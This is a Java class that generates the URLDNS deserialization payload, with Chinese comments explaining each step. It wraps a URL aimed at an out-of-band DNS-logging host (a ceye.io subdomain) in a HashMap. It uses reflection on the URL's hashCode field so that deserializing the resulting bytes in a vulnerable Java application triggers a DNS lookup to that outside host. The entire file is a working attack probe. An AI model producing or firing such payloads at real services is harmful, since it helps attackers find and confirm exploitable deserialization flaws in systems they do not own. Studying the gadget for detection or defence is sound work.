import util.SerializeUtil;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class payloadURLDNS {
    public static byte[] getpayloadURLDNS() throws Exception{
        HashMap hashMap = new HashMap();
        Class<?> aClass = Class.forName("java.net.URL");
        Constructor<?> constructor = aClass.getConstructor(String.class);
        URL url = (URL) constructor.newInstance("http://juu7xg.ceye.io");
        //获取URL类中的hashCode属性
        Field hashCode = aClass.getDeclaredField("hashCode");
        //绕过权限限制
        hashCode.setAccessible(true);
        //设置hashCode的值
        hashCode.set(url,123);
        System.out.println(url.hashCode());
        //添加到HashMap中
        hashMap.put(url,123);
        //设置hashCode的值
        hashCode.set(url,-1);
        return SerializeUtil.writeObjectToByteArray(hashMap).toByteArray();

    }
}
